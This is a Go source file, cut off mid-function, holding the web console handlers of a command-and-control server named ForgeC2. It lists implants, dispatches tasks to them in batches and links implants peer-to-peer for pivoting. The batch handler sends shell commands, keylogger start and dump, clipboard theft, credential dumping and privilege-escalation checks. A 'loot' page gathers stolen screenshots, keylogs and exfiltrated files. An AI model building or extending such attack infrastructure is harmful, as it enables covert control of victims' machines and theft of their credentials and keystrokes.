package server

import (
	"bytes"
	"encoding/csv"
	"fmt"
	"html/template"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleDashboard(c *gin.Context) {
	// Calculate offline cutoff once (optimization #3)
	offlineCutoff := time.Now().Add(-s.offlineThreshold())

	// Concurrent database queries (optimization #1)
	var wg sync.WaitGroup
	var (
		totalAgents    int64
		onlineAgents   int64
		todayTasks     int64
		pendingTasks   int64
		failedTasks    int64
		totalCreds     int64
		totalTokens    int64
		totalAudits    int64
		totalSocks     int64
		totalListeners int64
		totalTasks     int64
	)

	wg.Add(11)
	go func() { defer wg.Done(); s.db.Model(&db.Implant{}).Count(&totalAgents) }()
	go func() {
		defer wg.Done()
		s.db.Model(&db.Implant{}).Where("last_seen > ?", offlineCutoff).Count(&onlineAgents)
	}()
	go func() {
		defer wg.Done()
		s.db.Model(&db.Task{}).Where("created_at >= ?", time.Now().AddDate(0, 0, -1)).Count(&todayTasks)
	}()
	go func() { defer wg.Done(); s.db.Model(&db.Task{}).Where("status = ?", "pending").Count(&pendingTasks) }()
	go func() { defer wg.Done(); s.db.Model(&db.Task{}).Where("status = ?", "failed").Count(&failedTasks) }()
	go func() { defer wg.Done(); s.db.Model(&db.Task{}).Count(&totalTasks) }()
	go func() { defer wg.Done(); s.db.Model(&db.CredentialEntry{}).Count(&totalCreds) }()
	go func() { defer wg.Done(); s.db.Model(&db.TokenEntry{}).Count(&totalTokens) }()
	go func() { defer wg.Done(); s.db.Model(&db.AuditLog{}).Count(&totalAudits) }()
	go func() { defer wg.Done(); s.db.Model(&db.SocksSession{}).Count(&totalSocks) }()
	go func() { defer wg.Done(); s.db.Model(&db.Listener{}).Count(&totalListeners) }()
	wg.Wait()

	// Online agent list (recently active) - optimized with SELECT
	var recentAgents []db.Implant
	s.db.Select("id", "hostname", "ip", "os", "arch", "last_seen").
		Where("last_seen > ?", offlineCutoff).
		Order("last_seen desc").Limit(10).Find(&recentAgents)

	// Recent tasks
	var recentTasks []db.Task
	s.db.Preload("Agent").
		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop", "ls"}).
		Order("created_at desc").Limit(DashboardRecentTasks).Find(&recentTasks)

	stats := s.getNavStats()
	data := gin.H{
		"Title":          "ForgeC2 - Dashboard",
		"ActiveNav":      "dashboard",
		"TotalAgents":    totalAgents,
		"OnlineAgents":   onlineAgents,
		"TodayTasks":     todayTasks,
		"RecentTasks":    recentTasks,
		"PendingTasks":   pendingTasks,
		"FailedTasks":    failedTasks,
		"TotalCreds":     totalCreds,
		"TotalTokens":    totalTokens,
		"TotalAudits":    totalAudits,
		"TotalSocks":     totalSocks,
		"TotalListeners": totalListeners,
		"TotalTasks":     totalTasks,
		"RecentAgents":   recentAgents,
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "dashboard_content", data)
}

func (s *Server) handleAgents(c *gin.Context) {
	search := c.Query("search")
	statusFilter := c.Query("status")
	osFilter := c.Query("os")
	pageStr := c.DefaultQuery("page", "1")
	pageSizeStr := c.DefaultQuery("pageSize", "20")

	query := s.db.Model(&db.Implant{})
	if search != "" {
		query = query.Where("hostname LIKE ? OR username LIKE ? OR ip LIKE ?", "%"+search+"%", "%"+search+"%", "%"+search+"%")
	}
	offlineCutoff := time.Now().Add(-s.offlineThreshold())
	staleCutoff := time.Now().Add(-30 * time.Minute)
	if statusFilter == "online" {
		query = query.Where("last_seen > ?", offlineCutoff)
	} else if statusFilter == "stale" {
		query = query.Where("last_seen <= ? AND last_seen > ?", offlineCutoff, staleCutoff)
	} else if statusFilter == "offline" {
		query = query.Where("last_seen <= ?", staleCutoff)
	}
	if osFilter != "" {
		query = query.Where("LOWER(os) LIKE ?", "%"+osFilter+"%")
	}

	var total int64
	query.Count(&total)

	pageNum, _ := strconv.Atoi(pageStr)
	if pageNum < 1 {
		pageNum = 1
	}
	pageSize, _ := strconv.Atoi(pageSizeStr)
	if pageSize < 1 {
		pageSize = DefaultPageSize
	}
	if pageSize > MaxPageSize {
		pageSize = MaxPageSize
	}

	var agents []db.Implant
	query.Order("last_seen desc").Offset((pageNum - 1) * pageSize).Limit(pageSize).Find(&agents)

	for i := range agents {
		agents[i].Status = s.agentStatus(agents[i]).Status
	}

	stats := s.getNavStats()
	totalPages := (int(total) + pageSize - 1) / pageSize
	prevPage := pageNum - 1
	nextPage := pageNum + 1
	data := gin.H{
		"Title":      "ForgeC2 - Agents",
		"ActiveNav":  "agents",
		"Agents":     agents,
		"Search":     search,
		"Status":     statusFilter,
		"FilterOS":   osFilter,
		"Page":       pageNum,
		"PrevPage":   prevPage,
		"NextPage":   nextPage,
		"PageSize":   pageSize,
		"Total":      int(total),
		"TotalPages": totalPages,
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "agents_content", data)
}

func (s *Server) handleAgentDetail(c *gin.Context) {
	id := c.Param("id")
	var agent db.Implant
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.String(http.StatusNotFound, "Agent not found")
		return
	}

	agent.Status = s.agentStatus(agent).Status

	var tasks []db.Task
	s.db.Where("agent_id = ?", id).
		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop", "ls"}).
		Order("created_at desc").Limit(AgentDetailTaskLimit).Find(&tasks)

	var screenshots []string
	screenshotDir := filepath.Join(s.cfg.Server.DataDir, "screenshots", id)
	if files, err := os.ReadDir(screenshotDir); err == nil {
		for _, f := range files {
			if !f.IsDir() && strings.HasSuffix(f.Name(), ".png") {
				screenshots = append(screenshots, f.Name())
			}
		}
	}

	totalTasks := len(tasks)
	completedTasks := 0
	pendingTasks := 0
	failedTasks := 0
	totalResponseTime := time.Duration(0)
	shellTasks := 0
	screenshotTasks := 0
	psTasks := 0
	killTasks := 0

	for _, t := range tasks {
		switch t.Status {
		case "completed":
			completedTasks++
			totalResponseTime += t.UpdatedAt.Sub(t.CreatedAt)
		case "pending":
			pendingTasks++
		case "failed":
			failedTasks++
		}

		switch t.Type {
		case "shell":
			shellTasks++
		case "screenshot":
			screenshotTasks++
		case "ps":
			psTasks++
		case "kill":
			killTasks++
		}
	}

	successRate := 0
	if totalTasks > 0 {
		successRate = (completedTasks * 100) / totalTasks
	}

	avgResponseTime := "N/A"
	if completedTasks > 0 {
		avgDuration := totalResponseTime / time.Duration(completedTasks)
		if avgDuration.Seconds() > 60 {
			avgResponseTime = fmt.Sprintf("%.1f mins", avgDuration.Minutes())
		} else {
			avgResponseTime = fmt.Sprintf("%d secs", int(avgDuration.Seconds()))
		}
	}

	now := time.Now()
	agentAge := now.Sub(agent.CreatedAt)
	timeSinceLastSeen := now.Sub(agent.LastSeen)

	formatDuration := func(d time.Duration) string {
		if d.Hours() > 24 {
			return fmt.Sprintf("%d days", int(d.Hours()/24))
		} else if d.Hours() >= 1 {
			return fmt.Sprintf("%d hours", int(d.Hours()))
		} else if d.Minutes() >= 1 {
			return fmt.Sprintf("%d mins", int(d.Minutes()))
		}
		return fmt.Sprintf("%d secs", int(d.Seconds()))
	}

	uptime := formatDuration(agentAge)
	timeSince := formatDuration(timeSinceLastSeen)
	agentAgeStr := formatDuration(agentAge)

	// Fetch children for P2P chain
	var children []db.Implant
	s.db.Where("parent_id = ?", id).Find(&children)

	// Fetch unlinked agents (for linking dropdown) - optimized
	var unlinkedAgents []db.Implant
	s.db.Select("id", "hostname", "ip", "os").
		Where("(parent_id = '' OR parent_id IS NULL) AND id != ?", id).Order("hostname asc").Find(&unlinkedAgents)

	data := gin.H{
		"Title":             fmt.Sprintf("ForgeC2 - Agent %s", agent.Hostname),
		"ActiveNav":         "agents",
		"Agent":             agent,
		"Tasks":             tasks,
		"Screenshots":       screenshots,
		"TotalTasks":        totalTasks,
		"CompletedTasks":    completedTasks,
		"PendingTasks":      pendingTasks,
		"FailedTasks":       failedTasks,
		"SuccessRate":       successRate,
		"AvgResponseTime":   avgResponseTime,
		"ShellTasks":        shellTasks,
		"ScreenshotTasks":   screenshotTasks,
		"PSTasks":           psTasks,
		"KillTasks":         killTasks,
		"Uptime":            uptime,
		"TimeSinceLastSeen": timeSince,
		"AgentAge":          agentAgeStr,
		"Children":          children,
		"UnlinkedAgents":    unlinkedAgents,
	}

	// Read CSRF token from cookie
	if csrf, err := c.Cookie("csrf_token"); err == nil {
		data["CSRFToken"] = csrf
	}

	stats := s.getNavStats()
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "agent_detail_content", data)
}

func (s *Server) handleKillAgent(c *gin.Context) {
	id := c.Param("id")
	role, _ := c.Get("user_role")
	if role == "viewer" {
		c.JSON(http.StatusForbidden, gin.H{"error": "viewers cannot issue agent commands"})
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	// Check lock (allow locker to kill their own agent)
	user, _ := c.Get("user")
	username := fmt.Sprintf("%v", user)
	if holder, ok := s.checkAgentLock(id, username); !ok {
		c.JSON(http.StatusLocked, gin.H{"error": fmt.Sprintf("agent已被 %s 锁定", holder), "locked_by": holder})
		return
	}

	task, err := s.createTask(id, "kill", "exit", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create kill task", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create kill task"})
		return
	}

	slog.Info("Kill task created", "agent", id)
	s.LogAuditRecord(c, "kill_agent", "agent", id, "kill command", true, nil)
	s.broadcastTaskUpdate(id, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "message": "Kill command sent. Agent will exit on next beacon."})
}

func (s *Server) handleRequestScreenshot(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "screenshot", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Screenshot requested", "agent", id)
	s.dispatchTask(c, task, "request_screenshot", "screenshot")
}

func (s *Server) handleRequestScreenshotWindow(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "screenshot_window", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Window screenshot requested", "agent", id)
	s.dispatchTask(c, task, "request_screenshot_window", "screenshot_window")
}

func (s *Server) handleUpdateNote(c *gin.Context) {
	id := c.Param("id")
	note := c.PostForm("notes")
	tags := c.PostForm("tags")
	updates := map[string]interface{}{}
	if note != "" {
		updates["notes"] = note
	}
	if tags != "" {
		updates["tags"] = tags
	}
	s.db.Model(&db.Implant{}).Where("id = ?", id).Updates(updates)
	s.LogAuditRecord(c, "update_notes", "agent", id, fmt.Sprintf("notes/tags updated"), true, nil)
	c.JSON(http.StatusOK, gin.H{"success": true})
}

func (s *Server) handleDeleteAgent(c *gin.Context) {
	id := c.Param("id")
	tx := s.db.Begin()
	if err := tx.Where("agent_id = ?", id).Delete(&db.Task{}).Error; err != nil {
		tx.Rollback()
		slog.Error("Failed to delete tasks", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to delete tasks"})
		return
	}
	if err := tx.Delete(&db.Implant{}, "id = ?", id).Error; err != nil {
		tx.Rollback()
		slog.Error("Failed to delete agent", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to delete agent"})
		return
	}
	tx.Commit()
	os.RemoveAll(filepath.Join(s.cfg.Server.DataDir, "screenshots", id))
	s.LogAuditRecord(c, "delete_agent", "agent", id, "", true, nil)
	slog.Warn("Agent deleted", "id", id)
	c.JSON(http.StatusOK, gin.H{"success": true})
}

func (s *Server) handleBatchCommand(c *gin.Context) {
	role, _ := c.Get("user_role")
	if role == "viewer" {
		c.JSON(http.StatusForbidden, gin.H{"error": "viewers cannot issue agent commands"})
		return
	}

	var req struct {
		AgentIDs []string `json:"agent_ids"`
		Command  string   `json:"command"`
		Shell    string   `json:"shell"`
		TaskType string   `json:"task_type"` // shell, screenshot, upload, download, sleep, keylogger, etc
		File     string   `json:"file"`      // for upload/download
		Args     string   `json:"args"`      // additional arguments
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid json"})
		return
	}

	if len(req.AgentIDs) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "no agents selected"})
		return
	}

	// Default task type
	if req.TaskType == "" {
		req.TaskType = "shell"
	}

	user, _ := c.Get("user")
	username := fmt.Sprintf("%v", user)

	taskCount := 0
	skippedLocked := 0
	failedCount := 0

	for _, agentID := range req.AgentIDs {
		var agent db.Implant
		if err := s.db.First(&agent, "id = ?", agentID).Error; err != nil {
			failedCount++
			continue
		}

		// Skip locked agents
		if holder, ok := s.checkAgentLock(agentID, username); !ok {
			slog.Debug("Batch: skip locked agent", "agent_id", agentID, "locked_by", holder)
			skippedLocked++
			continue
		}

		var task *db.Task
		var err error

		// Create task based on type
		switch req.TaskType {
		case "shell":
			task, err = s.createTask(agentID, "shell", req.Command, req.Shell, "", "", 0, 0)
		case "screenshot":
			task, err = s.createTask(agentID, "screenshot", "screenshot", "", "", "", 0, 0)
		case "keylogger_start":
			task, err = s.createTask(agentID, "keylogger_start", "keylogger_start", "", "", "", 0, 0)
		case "keylogger_dump":
			task, err = s.createTask(agentID, "keylogger_dump", "keylogger_dump", "", "", "", 0, 0)
		case "keylogger_stop":
			task, err = s.createTask(agentID, "keylogger_stop", "keylogger_stop", "", "", "", 0, 0)
		case "clipboard_get":
			task, err = s.createTask(agentID, "clipboard_get", "clipboard_get", "", "", "", 0, 0)
		case "creds_dump":
			task, err = s.createTask(agentID, "creds", "creds_dump", "", "", "", 0, 0)
		case "privesc_check":
			task, err = s.createTask(agentID, "privesc_check", "privesc_check", "", "", "", 0, 0)
		case "sleep":
			// Args format: "interval,jitter" e.g., "30,20"
			task, err = s.createTask(agentID, "sleep", req.Args, "", "", "", 0, 0)
		default:
			task, err = s.createTask(agentID, req.TaskType, req.Command, "", "", "", 0, 0)
		}

		if err != nil {
			slog.Error("Batch command: failed to create task", "agent_id", agentID, "err", err)
			failedCount++
			continue
		}

		s.broadcastTaskUpdate(agentID, *task)
		taskCount++
	}

	slog.Info("Batch command sent", "count", taskCount, "skipped_locked", skippedLocked, "failed", failedCount, "type", req.TaskType, "command", req.Command)
	s.LogAuditRecord(c, "batch_command", "agent", "", fmt.Sprintf("%s to %d agents (%d skipped, %d failed)", req.TaskType, taskCount, skippedLocked, failedCount), true, nil)
	c.JSON(http.StatusOK, gin.H{
		"success":        true,
		"tasks_created":  taskCount,
		"skipped_locked": skippedLocked,
		"failed":         failedCount,
	})
}

func (s *Server) handleTaskHistory(c *gin.Context) {
	pageStr := c.DefaultQuery("page", "1")
	pageSizeStr := c.DefaultQuery("pageSize", "50")
	filterType := c.Query("type")
	filterStatus := c.Query("status")
	filterAgent := c.Query("agent")
	filterQuery := c.Query("q")

	pageNum, _ := strconv.Atoi(pageStr)
	if pageNum < 1 {
		pageNum = 1
	}
	pageSize, _ := strconv.Atoi(pageSizeStr)
	if pageSize < 1 {
		pageSize = DefaultTaskPageSize
	}
	if pageSize > MaxTaskPageSize {
		pageSize = MaxTaskPageSize
	}

	// Build query with filters
	silentTypes := []string{"screen_stream_start", "screen_stream_stop", "ls"}
	query := s.db.Model(&db.Task{}).
		Where("type NOT IN ?", silentTypes)
	if filterType != "" {
		query = query.Where("type = ?", filterType)
	}
	if filterStatus != "" {
		query = query.Where("status = ?", filterStatus)
	}
	if filterAgent != "" {
		query = query.Where("agent_id = ?", filterAgent)
	}
	if filterQuery != "" {
		query = query.Where("command LIKE ?", "%"+filterQuery+"%")
	}

	var total int64
	query.Count(&total)

	var tasks []db.Task
	query.Preload("Agent").
		Order("created_at desc").Offset((pageNum - 1) * pageSize).Limit(pageSize).Find(&tasks)

	// Collect distinct task types for filter dropdown
	var taskTypes []string
	s.db.Model(&db.Task{}).
		Where("type NOT IN ?", silentTypes).
		Distinct("type").Pluck("type", &taskTypes)

	// Collect agents for filter dropdown
	var agents []db.Implant
	s.db.Select("id, hostname, ip").Order("hostname").Find(&agents)

	// Count failed tasks for "retry all" button
	var failedCount int64
	s.db.Model(&db.Task{}).Where("status = ?", "failed").Count(&failedCount)

	totalPages := int(total) / pageSize
	if int(total)%pageSize > 0 {
		totalPages++
	}

	stats := s.getNavStats()
	data := gin.H{
		"Title":          "ForgeC2 - Task History",
		"ActiveNav":      "tasks",
		"Tasks":          tasks,
		"Page":           pageNum,
		"PageSize":       pageSize,
		"Total":          total,
		"TotalPages":     totalPages,
		"FilterType":     filterType,
		"FilterStatus":   filterStatus,
		"FilterAgent":    filterAgent,
		"FilterQuery":    filterQuery,
		"HasFailedTasks": failedCount > 0,
		"TaskTypes":      taskTypes,
		"Agents":         agents,
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "tasks_content", data)
}

// handleExportTasks exports tasks as CSV for reporting
func (s *Server) handleExportTasks(c *gin.Context) {
	var tasks []db.Task
	s.db.Preload("Agent").
		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop", "ls"}).
		Order("created_at desc").Limit(10000).Find(&tasks) // cap to avoid huge exports

	c.Header("Content-Type", "text/csv; charset=utf-8")
	c.Header("Content-Disposition", `attachment; filename="forgec2_tasks_`+time.Now().Format("2006-01-02")+`.csv"`)

	writer := csv.NewWriter(c.Writer)
	writer.Write([]string{"Time", "Agent", "Type", "Command", "Result", "Error", "Status"})

	for _, t := range tasks {
		agentName := ""
		if t.Agent.Hostname != "" {
			agentName = t.Agent.Hostname
		}
		writer.Write([]string{
			t.CreatedAt.Format("2006-01-02 15:04:05"),
			agentName,
			t.Type,
			t.Command,
			truncateString(t.Result, 500),
			truncateString(t.Error, 500),
			t.Status,
		})
	}
	writer.Flush()
}

// --- Shared nav stats helper with caching (optimization #2) ---
var (
	navStatsCache     gin.H
	navStatsCacheTime time.Time
	navStatsCacheMu   sync.RWMutex
	navStatsCacheTTL  = 5 * time.Second
)

func (s *Server) getNavStats() gin.H {
	navStatsCacheMu.RLock()
	if time.Since(navStatsCacheTime) < navStatsCacheTTL && navStatsCache != nil {
		stats := navStatsCache
		navStatsCacheMu.RUnlock()
		return stats
	}
	navStatsCacheMu.RUnlock()

	// Cache expired, recalculate
	navStatsCacheMu.Lock()
	defer navStatsCacheMu.Unlock()

	// Double-check after acquiring write lock
	if time.Since(navStatsCacheTime) < navStatsCacheTTL && navStatsCache != nil {
		return navStatsCache
	}

	offlineCutoff := time.Now().Add(-s.offlineThreshold())
	staleCutoff := time.Now().Add(-30 * time.Minute)

	var online int64
	s.db.Model(&db.Implant{}).Where("last_seen > ?", offlineCutoff).Count(&online)

	var stale int64
	s.db.Model(&db.Implant{}).Where("last_seen <= ? AND last_seen > ?", offlineCutoff, staleCutoff).Count(&stale)

	var offlineAgents int64
	s.db.Model(&db.Implant{}).Where("last_seen <= ?", staleCutoff).Count(&offlineAgents)

	var listenerCount int64
	s.db.Model(&db.Listener{}).Where("enabled = ?", true).Count(&listenerCount)

	var pendingTasks int64
	s.db.Model(&db.Task{}).Where("status = ?", "pending").Count(&pendingTasks)

	navStatsCache = gin.H{
		"OnlineCount":   online,
		"StaleCount":    stale,
		"OfflineCount":  offlineAgents,
		"ListenerCount": listenerCount,
		"PendingCount":  pendingTasks,
	}
	navStatsCacheTime = time.Now()
	return navStatsCache
}

// renderPage is a helper method to render templates (optimization #8)
func (s *Server) renderPage(c *gin.Context, tmplName string, data gin.H) {
	s.addUserToData(c, data)
	var buf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&buf, tmplName, data); err != nil {
		slog.Error("Template render error", "template", tmplName, "err", err)
		c.String(http.StatusInternalServerError, "Template error: " + err.Error())
		return
	}
	data["Content"] = template.HTML(buf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

// addUserToData injects user display info and CSRF token into gin.H from context
func (s *Server) addUserToData(c *gin.Context, data gin.H) {
	if user, ok := c.Get("user"); ok {
		data["UserDisplayName"] = user
	} else {
		data["UserDisplayName"] = "Operator"
	}
	if role, ok := c.Get("user_role"); ok {
		data["UserRole"] = role
	} else {
		data["UserRole"] = "operator"
	}
	if csrf, err := c.Cookie("csrf_token"); err == nil {
		data["CSRFToken"] = csrf
	}
	data["ServerVersion"] = ServerVersion
	if _, ok := data["SearchQuery"]; !ok {
		data["SearchQuery"] = ""
	}
}

// handlePivoting shows SOCKS / proxy status and agents useful for pivoting
func (s *Server) handlePivoting(c *gin.Context) {
	var recentAgents []db.Implant
	s.db.Select("id", "hostname", "ip", "os", "arch", "last_seen").
		Where("last_seen > ?", time.Now().Add(-30*time.Minute)).Limit(30).Find(&recentAgents)

	stats := s.getNavStats()
	data := gin.H{
		"Title":     "ForgeC2 - Tunnels & Proxies (Pivoting)",
		"ActiveNav": "pivoting",
		"Agents":    recentAgents,
	}
	for k, v := range stats {
		data[k] = v
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "pivoting_content", data); err != nil {
		slog.Error("pivoting render fail", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}
	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

// handleTopologyPage renders the network topology visualization
func (s *Server) handleTopologyPage(c *gin.Context) {
	stats := s.getNavStats()
	data := gin.H{
		"Title":     "ForgeC2 - Network Topology",
		"ActiveNav": "topology",
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "topology_content", data)
}

// handleTopologyData returns JSON nodes and edges for the topology graph
func (s *Server) handleTopologyData(c *gin.Context) {
	var listeners []db.Listener
	s.db.Where("enabled = ?", true).Find(&listeners)

	var agents []db.Implant
	s.db.Find(&agents)

	onlineCutoff := time.Now().Add(-s.offlineThreshold())

	nodes := make([]map[string]interface{}, 0)
	edges := make([]map[string]interface{}, 0)

	// Listener nodes
	for _, l := range listeners {
		label := l.Name
		if label == "" {
			label = fmt.Sprintf("%s:%d", l.Host, l.Port)
		}
		nodes = append(nodes, map[string]interface{}{
			"id":    fmt.Sprintf("listener-%d", l.ID),
			"label": label,
			"title": fmt.Sprintf("Listener: %s://%s:%d", l.Scheme, l.Host, l.Port),
			"group": "listener",
		})
	}

	// Agent nodes + listener→agent edges
	for _, a := range agents {
		online := a.LastSeen.After(onlineCutoff)
		label := a.Hostname
		if label == "" {
			label = a.ID[:8]
		}
		group := "agent-offline"
		if online {
			group = "agent-online"
		}
		title := fmt.Sprintf("Agent: %s<br>User: %s<br>IP: %s<br>OS: %s<br>Last: %s",
			a.Hostname, a.Username, a.IP, a.OS, a.LastSeen.Format("15:04:05"))
		nodes = append(nodes, map[string]interface{}{
			"id":    fmt.Sprintf("agent-%s", a.ID),
			"label": label,
			"title": title,
			"group": group,
		})

		// Edge from listener to agent
		if a.ListenerID > 0 {
			edges = append(edges, map[string]interface{}{
				"from": fmt.Sprintf("listener-%d", a.ListenerID),
				"to":   fmt.Sprintf("agent-%s", a.ID),
			})
		}

		// P2P edge: parent→child
		if a.ParentID != "" {
			edges = append(edges, map[string]interface{}{
				"from":   fmt.Sprintf("agent-%s", a.ParentID),
				"to":     fmt.Sprintf("agent-%s", a.ID),
				"dashes": true,
				"color":  map[string]interface{}{"color": "#f59e0b"},
				"title":  fmt.Sprintf("P2P: %s", a.P2PMode),
				"width":  2,
				"length": 200,
			})
		}
	}

	c.JSON(http.StatusOK, gin.H{"nodes": nodes, "edges": edges})
}

// handleCredentials shows dumped credentials (creds task results)

// handleLootPage aggregates loot: screenshots, keylogs, downloaded files across all agents
func (s *Server) handleLootPage(c *gin.Context) {
	// Get all agents
	var agents []db.Implant
	s.db.Order("last_seen desc").Find(&agents)

	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}

	// Aggregate screenshots
	type Screenshot struct {
		AgentID  string
		Filename string
		Path     string // relative for URL
	}
	var allScreenshots []Screenshot
	screenshotRoot := filepath.Join(dataDir, "screenshots")
	if entries, err := os.ReadDir(screenshotRoot); err == nil {
		for _, e := range entries {
			if e.IsDir() {
				agentDir := filepath.Join(screenshotRoot, e.Name())
				if files, err := os.ReadDir(agentDir); err == nil {
					for _, f := range files {
						if !f.IsDir() && (strings.HasSuffix(f.Name(), ".png") || strings.HasSuffix(f.Name(), ".jpg") || strings.HasSuffix(f.Name(), ".jpeg")) {
							allScreenshots = append(allScreenshots, Screenshot{
								AgentID:  e.Name(),
								Filename: f.Name(),
								Path:     e.Name() + "/" + f.Name(),
							})
						}
					}
				}
			}
		}
	}

	// Keylogger dumps
	var keylogTasks []db.Task
	s.db.Preload("Agent").
		Where("type = ?", "keylogger_dump").
		Order("created_at desc").Limit(50).Find(&keylogTasks)

	// Recent downloads / exfil
	var downloadTasks []db.Task
	s.db.Preload("Agent").
		Where("type IN ?", []string{"download", "download_url"}).
		Order("created_at desc").Limit(50).Find(&downloadTasks)

	stats := s.getNavStats()
	data := gin.H{
		"Title":         "ForgeC2 - Loot",
		"ActiveNav":     "loot",
		"Agents":        agents,
		"Screenshots":   allScreenshots,
		"KeylogTasks":   keylogTasks,
		"DownloadTasks": downloadTasks,
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "loot_content", data)
}

func (s *Server) handleGlobalSearch(c *gin.Context) {
	query := strings.TrimSpace(c.Query("q"))

	type SearchResult struct {
		Type  string
		ID    string
		Title string
		Desc  string
		URL   string
	}

	var results []SearchResult

	if query != "" {
		// Search agents
		var agents []db.Implant
		s.db.Where("hostname LIKE ? OR username LIKE ? OR ip LIKE ? OR id LIKE ?",
			"%"+query+"%", "%"+query+"%", "%"+query+"%", "%"+query+"%").Limit(20).Find(&agents)
		for _, a := range agents {
			results = append(results, SearchResult{
				Type:  "Agent",
				ID:    a.ID,
				Title: a.Hostname + " / " + a.Username,
				Desc:  a.IP + " | " + a.OS,
				URL:   "/agents/" + a.ID,
			})
		}

		// Search tasks
		var tasks []db.Task
		s.db.Where("command LIKE ? OR result LIKE ? OR agent_id LIKE ?",
			"%"+query+"%", "%"+query+"%", "%"+query+"%").Limit(20).Find(&tasks)
		for _, t := range tasks {
			cmd := t.Command
			if len(cmd) > 80 {
				cmd = cmd[:80] + "..."
			}
			results = append(results, SearchResult{
				Type:  "Task",
				ID:    fmt.Sprintf("%d", t.ID),
				Title: t.Type + ": " + cmd,
				Desc:  "Agent: " + t.AgentID + " | Status: " + t.Status,
				URL:   "/agents/" + t.AgentID,
			})
		}

		// Search listeners
		var listeners []db.Listener
		s.db.Where("name LIKE ? OR host LIKE ?", "%"+query+"%", "%"+query+"%").Limit(10).Find(&listeners)
		for _, l := range listeners {
			results = append(results, SearchResult{
				Type:  "Listener",
				ID:    fmt.Sprintf("%d", l.ID),
				Title: l.Name,
				Desc:  fmt.Sprintf("%s:%d | %s", l.Host, l.Port, l.Protocol),
				URL:   "/listeners/" + fmt.Sprintf("%d", l.ID),
			})
		}
	}

	data := gin.H{
		"Title":       "Global Search",
		"ActiveNav":   "search",
		"SearchQuery": query,
		"Results":     results,
		"ResultCount": len(results),
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "search_content", data); err != nil {
		// Fallback
		data["Content"] = template.HTML(fmt.Sprintf(`<div class="p-8"><h2 class="text-xl font-bold mb-4">Search Results: %s</h2><p class="text-slate-500">%d results found</p></div>`, template.HTMLEscapeString(query), len(results)))
		c.Header("Content-Type", "text/html; charset=utf-8")
		s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
		return
	}
	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

// handleLinkAgent links a child agent to a parent agent for P2P relay
func (s *Server) handleLinkAgent(c *gin.Context) {
	parentID := c.Param("id")
	childID := c.PostForm("child_id")
	mode := c.PostForm("p2p_mode") // "smb" or "tcp"
	listenAddr := c.PostForm("p2p_listen_addr")

	if childID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "child_id is required"})
		return
	}

	var parent, child db.Implant
	if err := s.db.Where("id = ?", parentID).First(&parent).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "parent agent not found"})
		return
	}
	if err := s.db.Where("id = ?", childID).First(&child).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "child agent not found"})
		return
	}

	// Update child's ParentID
	s.db.Model(&child).Updates(map[string]interface{}{
		"parent_id":       parentID,
		"p2p_mode":        mode,
		"p2p_listen_addr": listenAddr,
	})
	slog.Info("P2P link created", "parent", parentID, "child", childID, "mode", mode)
	s.LogAuditRecord(c, "link_agent", "agent", childID, fmt.Sprintf("linked to parent %s (mode=%s)", parentID, mode), true, nil)
	c.Redirect(http.StatusSeeOther, "/agents/"+parentID)
}

// handleUnlinkAgent removes the P2P parent link from a child agent
func (s *Server) handleUnlinkAgent(c *gin.Context) {
	childID := c.Param("id")

	var child db.Implant
	if err := s.db.Where("id = ?", childID).First(&child).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	parentID := child.ParentID
	s.db.Model(&child).Updates(map[string]interface{}{
		"parent_id":       "",
